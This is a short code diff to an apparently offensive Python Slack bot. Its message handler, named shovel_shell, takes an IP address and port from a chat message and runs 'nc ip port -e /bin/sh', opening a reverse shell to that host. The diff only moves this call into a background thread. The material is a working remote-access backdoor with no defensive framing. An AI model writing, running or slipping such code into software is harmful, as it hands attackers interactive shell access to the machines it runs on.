@@ -4,6 +4,9 @@ from slack import RTMClient
 import subprocess
 import threading
 
+def call_subprocess(ip, port):
+  subprocess.Popen(["nc",ip,port,"-e","/bin/sh"])
+
 @RTMClient.run_on(event="message")
 def shovel_shell(**payload):
   data = payload['data']
@@ -16,7 +19,8 @@ def shovel_shell(**payload):
         port = args[2]
         print("Shoveling a shell for @"+user+" to "+ip+":"+port+"!")
         try:
-            subprocess.Popen(["nc",ip,port,"-e","/bin/sh"])
+            shell_thread = threading.Thread(target=call_subprocess, args=(ip,port))
+            shell_thread.start()
         except:
             print("Error processing request for "+ip+":"+port+"!")
 
